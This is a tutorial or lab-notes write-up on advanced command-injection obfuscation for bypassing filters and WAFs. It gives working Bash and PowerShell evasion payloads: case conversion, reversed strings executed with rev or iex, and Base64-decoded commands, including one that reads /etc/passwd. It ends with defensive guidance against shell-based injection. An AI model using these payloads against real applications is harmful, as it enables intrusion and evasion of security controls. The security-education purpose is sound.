![Image](https://images.openai.com/static-rsc-4/lrLAJWsOilrFxoVMt2Gi2V6x4ZmIvqcAKVHpRHqh7PIi35cgNDcUX_PbxgXbwdPdBBfeVjnUQTkr0fs-2mM0Eqd7LDwTP6dqJnuEgnH70j3ODCc3iQ61uDP1Rq9vcMHcBJyWbv2NVdSziUF3XicfSmYc8Zq3lVM0VEJ_lOr5Etbw-jYLDRTMpVJ-Vf7q3lZ2?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/I8_RvbVZmmHGXXNUz5hBkFJHTdNP55q8-jyoBgiW5p--zaLX_-gDgXbsulROsHUSHm7S19ifCegsix1xjCB9qHhbbeBPPi-tHoRsoXo7nDpUZXp4-PeCNO9_31lOd0u2e7_qWAISyUeft-BnIMlPBpdVfZDnbaVNNodCbWDWzIZFaK5Ficj5g1Mi8KF6eBTn?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/zyv1w8bf-uOQO5yBUQrsZK8VR32kMRrDTlcfsJWJH-zvv-pgaLU0emGLHILh-a0MMd7J1Rd5gHmjBazHnTQY9y7RChqtjjxG1CEllfl9cYHkSxOBDjPZXwUdVaritveYrK7_0lZDRvdohkMrDW11m7uYQTY9_FkP-cA5hdgJ8dUZPYK2i_SDXruesRZ4af1U?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/4UjUYIoXAGJ4-LOPc1-7UijVEHNnNkL8_cGBWbdRBm1p9msf2Bk2XqPJLVJDTizygBWSAmKnrSn5KXj_AAn6xhpryMSJZtw51EyXkvRjeq_jb67kctswN722mGYZKwAs9KQEpsFq71Src6X56PE_xT0Oa0UVz0fRbxkj7TSg_CyPWApjPUzFlgSlev38Ug2t?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VPseyb43jhY2utd7XFvpR5dX8gp72geX-mJOIqPQNEAG1ySW-fI4kDiZ7Cm6lTtwF3-Yn4zJ9XYZXtvTgFXQRp3FdOrchPNKOD94X0VUER4F6dSacgYizr4O5lBZbMnTuRlF6GKhe_vdMUZHc0vhnsimOfLffutza6xIBBxBhBEaAOi1NIaN8pT82dAez9FZ?purpose=fullsize)

This section takes the previous concepts—**character filtering, space filtering, and command blacklists**—one step further.

The central idea is:

> **Change how a command looks to the filter while preserving how the shell ultimately interprets and executes it.**

These techniques are especially relevant when dealing with stronger filtering mechanisms such as **WAFs**.

---

# 1. Why Advanced Obfuscation Is Needed

Previously, we encountered filters such as:

```text
;
space
/
\
whoami
```

Simple bypasses may work against simple filters, but more advanced security mechanisms can recognize common payload patterns.

For example:

```text
127.0.0.1; whoami
```

might be detected immediately.

Even if we change the separator:

```text
127.0.0.1
whoami
```

the application could still recognize:

```text
whoami
```

Therefore, we need to consider **command obfuscation**.

---

# 2. What Is Command Obfuscation?

**Command obfuscation** is the process of changing the textual appearance of a command while retaining its intended behavior.

Conceptually:

```text
Original command
       ↓
Obfuscation
       ↓
Different-looking input
       ↓
Shell interpretation
       ↓
Original command
```

For example:

```text
whoami
```

may be represented in a different form that the shell can still interpret as the same command.

---

# 3. The Important Security Boundary

This entire topic revolves around a fundamental difference:

```text
Filter interpretation
        ≠
Shell interpretation
```

A filter may see:

```text
w'h'o'am'i
```

while the shell can interpret it as:

```text
whoami
```

Likewise, a filter may see an encoded representation while the shell receives the decoded command.

This is why **blacklisting strings is inherently fragile**.

---

# 4. Technique 1 — Case Manipulation

The first advanced technique is **case manipulation**.

Examples include:

```text
WHOAMI
WhOaMi
wHoAmI
```

The objective is to change the appearance of the command.

---

# 5. Windows and Case Manipulation

This technique is particularly straightforward on Windows because:

> **CMD and PowerShell command names are generally case-insensitive.**

For example:

```powershell
PS C:\htb> WhOaMi
```

can execute the same command as:

```text
whoami
```

Therefore, if a simplistic filter only searches for:

```text
whoami
```

changing the case may evade that particular check.

### Example

```text
Filter looks for:
whoami

Input:
WhOaMi

Shell:
whoami
```

---

# 6. Linux Case Sensitivity

Linux is different.

Bash command names are generally **case-sensitive**.

Therefore:

```bash
whoami
```

and:

```bash
WHOAMI
```

are not equivalent commands.

If we simply change the case on Linux:

```bash
WhOaMi
```

Bash will not automatically treat it as:

```text
whoami
```

So we need another technique.

---

# 7. Using `tr` for Case Conversion

The lab demonstrates:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

The important component is:

```bash
tr "[A-Z]" "[a-z]"
```

which translates uppercase characters into lowercase characters.

Conceptually:

```text
WhOaMi
  ↓
whoami
```

The command substitution:

```bash
$(...)
```

then allows the resulting text to be used as a command.

---

# 8. Breaking Down the `tr` Technique

The command:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

contains several concepts:

### `tr`

Performs character translation.

```text
[A-Z] → [a-z]
```

### `<<<`

Provides the string as input to the command.

### `"WhOaMi"`

The obfuscated command string.

### `$()`

Command substitution.

The conceptual flow is:

```text
"WhOaMi"
     ↓
tr
     ↓
"whoami"
     ↓
$()
     ↓
execution
```

---

# 9. Important Filter Interaction

The technique itself can be correct but still fail against a particular application.

Why?

Because the payload:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

contains **spaces**.

If the target application already blocks spaces, the payload will be rejected before the case-conversion technique can work.

This is an important lesson:

> **When combining bypass techniques, every part of the final payload must satisfy the filters.**

You cannot bypass one filter while accidentally triggering another.

---

# 10. Using Tabs Instead of Spaces

If spaces are filtered, a tab can sometimes serve as whitespace.

The encoded representation is:

```text
%09
```

So the conceptual transformation is:

```text
space
  ↓
tab
  ↓
%09 when URL-encoded
```

This allows the case-conversion technique to work in environments where tabs are accepted but literal spaces are blocked.

---

# 11. Another Linux Case-Conversion Technique

The lab also provides:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

The important Bash feature here is:

```bash
${a,,}
```

which converts the value of variable `a` to lowercase.

Conceptually:

```text
a="WhOaMi"
      ↓
${a,,}
      ↓
whoami
```

Then the resulting command can be used through command substitution.

---

# 12. Case Manipulation Summary

|Environment|Technique|Example|
|---|---|---|
|Windows CMD|Change case directly|`WhOaMi`|
|PowerShell|Change case directly|`WhOaMi`|
|Bash|`tr` conversion|`$(tr "[A-Z]" "[a-z]"...)`|
|Bash|Parameter expansion|`${a,,}`|

### Key takeaway

```text
Windows:
case change → often directly executable

Linux:
case change → requires conversion
```

---

# 13. Technique 2 — Reversed Commands

Another powerful obfuscation method is **reversing the command string**.

Instead of:

```text
whoami
```

we use:

```text
imaohw
```

The filter therefore doesn't see the original command word.

The shell-side logic then reverses it back before execution.

---

# 14. Reversing a String on Linux

The lab uses:

```bash
echo 'whoami' | rev
```

Result:

```text
imaohw
```

The `rev` command reverses the characters of its input.

Conceptually:

```text
whoami
 ↓
w h o a m i
 ↓
i m a o h w
 ↓
imaohw
```

---

# 15. Executing the Reversed Command

The lab demonstrates:

```bash
$(rev<<<'imaohw')
```

The process is:

```text
imaohw
   ↓
rev
   ↓
whoami
   ↓
$()
   ↓
execution
```

So the literal string:

```text
whoami
```

does not appear in the reversed representation.

---

# 16. Why Reversal Can Defeat a Simple Blacklist

Suppose:

```text
Blacklist:
whoami
```

Input:

```text
imaohw
```

A basic substring check may conclude:

```text
"whoami" not found
```

But the shell-side transformation produces:

```text
whoami
```

before execution.

Therefore:

```text
Filter:
imaohw

Execution:
whoami
```

Again, the filter and interpreter are operating on different representations.

---

# 17. Reversal and Filtered Characters

An important tip from the lab:

> **If you want to bypass a character filter using a reversed command, the characters involved in the final command may also need to be considered in their reversed position.**

The broader principle is:

```text
Transformation must preserve the intended final command.
```

You cannot blindly reverse a payload without considering the syntax surrounding it.

---

# 18. Reversed Commands on Windows

The same general concept can be implemented in PowerShell.

The lab first reverses the string:

```powershell
"whoami"[-1..-20] -join ''
```

Result:

```text
imaohw
```

Here:

```text
[-1..-20]
```

creates a reverse index sequence, and:

```text
-join ''
```

joins the characters back together without a separator.

---

# 19. Executing the Reversed String in PowerShell

The lab demonstrates:

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

The conceptual pipeline is:

```text
imaohw
  ↓
character indexing
  ↓
reverse order
  ↓
whoami
  ↓
iex
  ↓
execution
```

`iex` is PowerShell's alias for **Invoke-Expression**, which evaluates a string as PowerShell code.

---

# 20. Linux vs Windows Reversal

|Platform|Reverse|Execute|
|---|---|---|
|Linux/Bash|`rev`|`$()`|
|PowerShell|`[-1..-20] -join ''`|`iex`|

The syntax differs, but the concept remains:

```text
Obfuscated string
       ↓
Reverse
       ↓
Original command
       ↓
Interpret
```

---

# 21. Technique 3 — Encoded Commands

The third major technique is **encoding**.

This can be especially useful when the original command contains characters that are filtered or transformed during HTTP processing.

Instead of sending the command itself, we send an encoded representation.

Common encoding approaches include:

```text
Base64
Hex
```

The lab specifically demonstrates Base64.

---

# 22. Base64 Concept

Suppose the original command is:

```text
cat /etc/passwd | grep 33
```

We encode it:

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

Result:

```text
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

The important observation is that the encoded string no longer visibly contains:

```text
/
|
spaces
```

or the original command words.

---

# 23. Base64 Encoding Pipeline

Conceptually:

```text
Original command
       ↓
Base64 encode
       ↓
Encoded string
       ↓
Send encoded representation
       ↓
Decode on target
       ↓
Execute
```

So:

```text
cat /etc/passwd | grep 33
```

becomes:

```text
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

---

# 24. Decoding and Executing on Linux

The lab demonstrates:

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

Conceptually:

```text
Base64 string
      ↓
base64 -d
      ↓
Original command
      ↓
bash
      ↓
execution
```

The `<<<` syntax is important in the lab because it avoids using a literal pipe `|`, which was one of the filtered characters.

---

# 25. Why `<<<` Matters

Normally, you might think about using:

```text
command | another-command
```

But if:

```text
|
```

is blocked, that's a problem.

The lab instead uses Bash's here-string syntax:

```bash
<<<
```

Conceptually:

```text
data
 ↓
<<<
 ↓
command input
```

This demonstrates another recurring principle:

> **When one shell construct is filtered, another construct may provide equivalent functionality.**

---

# 26. Encoding Does Not Automatically Mean Security

Encoding is **not encryption**.

Base64 simply transforms data into another representation.

For example:

```text
whoami
```

can be represented as:

```text
d2hvYW1p
```

Anyone can decode it.

Therefore:

```text
Encoding ≠ Security
```

In this context, encoding is being discussed as an **obfuscation technique**, not a security mechanism.

---

# 27. Alternative Linux Tools

The lab notes that if particular commands themselves are filtered, alternative tools may exist.

For example:

```text
bash
sh
base64
openssl
xxd
```

The important conceptual lesson is:

> **A filter that blocks a single command doesn't necessarily eliminate the underlying capability.**

For example:

```text
Base64 decoding
```

might potentially be performed by different utilities.

---

# 28. Windows Base64 Encoding

PowerShell has built-in Base64 functionality.

The lab demonstrates:

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

Result:

```text
dwBoAG8AYQBtAGkA
```

Notice that this differs from the normal UTF-8 Base64 representation.

PowerShell's demonstrated method uses:

```text
Unicode / UTF-16LE
```

encoding.

---

# 29. Why PowerShell Uses UTF-16LE Here

The process is:

```text
whoami
  ↓
UTF-16LE / Unicode bytes
  ↓
Base64
  ↓
dwBoAG8AYQBtAGkA
```

This is important when reproducing the technique.

If you Base64-encode the UTF-8 bytes instead, you will get a different result.

---

# 30. Creating the Same Encoding on Linux

The lab demonstrates converting UTF-8 to UTF-16LE first:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

Result:

```text
dwBoAG8AYQBtAGkA
```

So the Linux process becomes:

```text
UTF-8 string
      ↓
iconv
      ↓
UTF-16LE
      ↓
base64
      ↓
PowerShell-compatible Base64
```

---

# 31. PowerShell Base64 Decoding and Execution

The lab uses:

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

Conceptually:

```text
Base64
  ↓
FromBase64String()
  ↓
Unicode.GetString()
  ↓
Original command
  ↓
iex
  ↓
execution
```

---

# 32. Three Advanced Techniques Compared

|Technique|Original|Obfuscated form|Main idea|
|---|---|---|---|
|Case manipulation|`whoami`|`WhOaMi`|Change character case|
|Reversal|`whoami`|`imaohw`|Reverse command|
|Encoding|`whoami`|Base64 representation|Encode command|

---

# 33. Linux vs Windows

|Technique|Linux/Bash|Windows|
|---|---|---|
|Case manipulation|Requires conversion|Usually directly works|
|Reversal|`rev`|PowerShell indexing|
|Command substitution|`$()`|PowerShell expressions|
|Base64|`base64`|`[Convert]` APIs|
|Text encoding|`iconv`|`.NET Encoding`|
|Execution|`bash` / shell|`iex` / PowerShell|

---

# 34. The Full Obfuscation Pipeline

This section can be visualized as:

```text
                         USER INPUT
                             │
                             ▼
                     ┌───────────────┐
                     │ Application   │
                     │ Filter / WAF  │
                     └───────┬───────┘
                             │
                      Obfuscated data
                             │
                             ▼
                    ┌─────────────────┐
                    │ Shell / Parser  │
                    └────────┬────────┘
                             │
                   Decode / transform
                             │
                             ▼
                      Original command
                             │
                             ▼
                         Execution
```

The key weakness being demonstrated is that the security filter may inspect the payload **before all transformations have occurred**.

---

# 35. Important Interaction With Previous Filters

This is probably the most important practical lesson from the entire module.

A payload can contain multiple layers:

```text
Command injection
      +
operator bypass
      +
space bypass
      +
character bypass
      +
command obfuscation
```

But if **any one component** is blocked, the payload fails.

For example:

```text
Case conversion technique
        ↓
contains spaces
        ↓
Space filter
        ↓
BLOCKED
```

Therefore, when troubleshooting a lab payload:

```text
1. Identify the filter.
2. Identify every character in the payload.
3. Check every command used.
4. Check shell compatibility.
5. Check URL encoding/decoding.
6. Determine where transformation occurs.
```

---

# 36. Transformation Layers

A useful mental model is:

```text
HTTP Request
     ↓
URL decoding
     ↓
Application processing
     ↓
Application filter
     ↓
Command construction
     ↓
Shell parsing
     ↓
Variable expansion
     ↓
Command substitution
     ↓
Execution
```

Different defenses operate at different points.

Understanding **where** a transformation happens is often more important than memorizing a particular payload.

---

# 37. WAF Considerations

A WAF can inspect HTTP requests before they reach the application.

Conceptually:

```text
Browser
   ↓
WAF
   ↓
Web Application
   ↓
Shell
```

A sophisticated WAF may recognize common command-injection patterns.

However, obfuscation demonstrates why signature-based detection can be challenging:

```text
Payload A
whoami

Payload B
w'h'o'am'i

Payload C
imaohw → reversed

Payload D
Base64 → encoded representation
```

They look very different at the HTTP layer but can potentially lead to similar behavior after processing.

---

# 38. Why Simple Blacklists Fail

A blacklist might attempt:

```text
Block:
whoami
cat
bash
```

But a command can potentially be transformed.

The broader lesson is:

```text
Blocking known strings
          ↓
doesn't guarantee
          ↓
blocking the underlying behavior
```

This is why secure application architecture is preferable to endlessly expanding blacklists.

---

# 39. Other Obfuscation Methods

The section briefly mentions additional possibilities, including:

```text
Wildcards
Regex-related techniques
Output redirection
Integer expansion
Variable expansion
```

These belong to the larger family of **shell parsing and command-obfuscation techniques**.

The important thing isn't to memorize every possible trick.

Instead, understand:

> **How the shell transforms input before execution.**

---

# 40. Methodology for Studying Obfuscation

When analyzing a command-obfuscation technique in a legal lab:

```text
             Start
               │
               ▼
       Identify blocked word
               │
               ▼
       Identify blocked chars
               │
               ▼
       Identify target shell
               │
               ▼
       Build transformation
               │
       ┌───────┴────────┐
       ▼                ▼
   Case change       Reverse
       │                │
       └───────┬────────┘
               ▼
            Encode
               │
               ▼
       Test transformation
               │
               ▼
      Check all filters
```

---

# 41. Common Mistakes

### ❌ Mistake 1 — Assuming case manipulation works everywhere

Windows:

```text
WhOaMi
```

can work because command names are generally case-insensitive.

Linux:

```text
WhOaMi
```

is not equivalent to:

```text
whoami
```

without transformation.

---

### ❌ Mistake 2 — Forgetting spaces

A technically correct obfuscation can still be blocked because it contains:

```text
space
```

Always check the previously identified filters.

---

### ❌ Mistake 3 — Using the wrong Base64 encoding

UTF-8 and UTF-16LE produce different Base64 strings.

PowerShell's demonstrated approach uses Unicode/UTF-16LE.

---

### ❌ Mistake 4 — Assuming encoding is encryption

Base64 is reversible and provides no confidentiality.

---

### ❌ Mistake 5 — Ignoring the shell

A Bash technique isn't automatically a CMD or PowerShell technique.

---

# 42. Defensive Lessons

From a defender's perspective, this section demonstrates why:

```text
Blacklist
    ↓
Blacklist expansion
    ↓
More signatures
    ↓
More bypasses
```

is an endless cycle.

A stronger design is:

### 1. Avoid shell execution where possible

Don't construct shell commands from user-controlled strings.

### 2. Use strict allowlists

If expecting an IP address, validate that the input is actually an IP address.

### 3. Pass arguments separately

Use process APIs that allow argument separation rather than shell string concatenation.

### 4. Minimize interpreter involvement

Avoid unnecessary:

```text
shell → eval → command substitution → dynamic execution
```

### 5. Apply validation server-side

Client-side validation alone is insufficient.

---

# 43. High-Value Revision Table

|Concept|Linux|Windows|
|---|---|---|
|Case sensitivity|Case-sensitive|CMD/PowerShell generally case-insensitive|
|Case conversion|`tr`, `${var,,}`|Usually unnecessary|
|Reverse string|`rev`|`[-1..-n] -join ''`|
|Command substitution|`$()`|PowerShell expressions|
|Base64 encoding|`base64`|`[Convert]::ToBase64String()`|
|Base64 decoding|`base64 -d`|`[Convert]::FromBase64String()`|
|Text conversion|`iconv`|`.NET Encoding`|
|Dynamic execution|`bash`|`iex`|

---

# 44. Master Cheat Sheet

```text
╔══════════════════════════════════════════════╗
║       ADVANCED COMMAND OBFUSCATION           ║
╚══════════════════════════════════════════════╝


1. CASE MANIPULATION
──────────────────────────────────────────────

Windows:

WhOaMi
      ↓
whoami

CMD / PowerShell are generally
case-insensitive.


Linux:

WhOaMi
   ↓
tr
   ↓
whoami

Example concept:

$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

Alternative:

$(a="WhOaMi";printf %s "${a,,}")


IMPORTANT:
Check for other filters such as spaces.


2. REVERSED COMMANDS
──────────────────────────────────────────────

Original:

whoami

Reverse:

imaohw

Linux:

echo 'whoami' | rev

Execute:

$(rev<<<'imaohw')


PowerShell:

"whoami"[-1..-20] -join ''

Execute:

iex "$('imaohw'[-1..-20] -join '')"


3. BASE64 ENCODING
──────────────────────────────────────────────

Original:

cat /etc/passwd | grep 33

Base64:

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==


Linux concept:

encode
   ↓
Base64
   ↓
decode
   ↓
shell
   ↓
execute


PowerShell:

Unicode / UTF-16LE
       ↓
Base64
       ↓
decode
       ↓
iex
       ↓
execute


4. CORE PRINCIPLE
──────────────────────────────────────────────

Filter sees:

Obfuscated / encoded representation

             ↓

Shell / interpreter transforms it

             ↓

Original command behavior


5. REMEMBER
──────────────────────────────────────────────

• Shell matters
• Filters may exist at multiple layers
• Check every character
• Check every command
• Check URL encoding/decoding
• Environment matters
• Encoding ≠ encryption
• Blacklists are fragile
```

## 🧠 Final Mental Model

Think of advanced command obfuscation as **changing the representation rather than changing the underlying intent**:

```text
                    ORIGINAL COMMAND
                           │
          ┌────────────────┼────────────────┐
          │                │                │
          ▼                ▼                ▼
     Case change        Reverse          Encode
          │                │                │
          ▼                ▼                ▼
     WhOaMi             imaohw       Base64 string
          │                │                │
          └────────────────┼────────────────┘
                           ▼
                    Transformation
                           │
                           ▼
                    Shell interprets
                           │
                           ▼
                  Intended command
```

**The most important takeaway:** a security filter that only searches for known command strings is operating on the _text it receives_, while the shell may perform several transformations before execution. Secure applications therefore should not rely on command blacklists as their primary defense; they should avoid unsafe shell invocation and strictly validate and separate user-controlled arguments.